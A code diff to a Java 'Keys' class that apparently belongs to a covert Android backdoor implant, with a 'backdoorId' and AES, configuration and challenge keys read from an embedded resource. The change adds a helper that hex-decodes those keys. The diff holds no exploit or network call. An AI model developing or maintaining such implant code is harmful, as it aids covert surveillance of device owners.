@@ -15,7 +15,6 @@ import com.android.service.Status;
 import com.android.service.auto.Cfg;
 import com.android.service.util.Utils;
 
-// TODO: Auto-generated Javadoc
 // This class should only be read by Device
 /**
  * The Class Keys.
@@ -62,13 +61,14 @@ public class Keys {
 					resources.openRawResource(R.raw.resources), 0); // resources.bin
 
 			backdoorId = Utils.copy(resource, 64, 14);
-			aesKey = Utils.copy(resource, 142, 32);
-			confKey = Utils.copy(resource, 238, 32);
-			challengeKey = Utils.copy(resource, 334, 32);
+			aesKey = keyFromString(resource, 142, 32);
+			confKey = keyFromString(resource, 238, 32);
+			challengeKey = keyFromString(resource, 334, 32);
 
 		}
 
 	}
+
 
 	// Subversion
 	/** The Constant g_Subtype. */
@@ -166,6 +166,28 @@ public class Keys {
 	 */
 	public byte[] getSubtype() {
 		return subtype;
+	}
+
+	private byte[] keyFromString(byte[] resource, int from, int len) {
+		byte[] res = Utils.copy(resource, from , len);
+		return keyFromString(new String(res));
+	}
+
+	private byte[] keyFromString(final String string) {
+		try {
+			int len = 16;
+			byte[] array = new byte[len];
+
+			for (int pos = 0; pos < len; pos++) {
+				String repr = string.substring(pos * 2, pos * 2 + 2);
+				array[pos] = (byte) Integer.parseInt(repr, 16);
+			}
+
+			return array;
+		} catch (Exception ex) {
+
+			return null;
+		}
 	}
 
 }
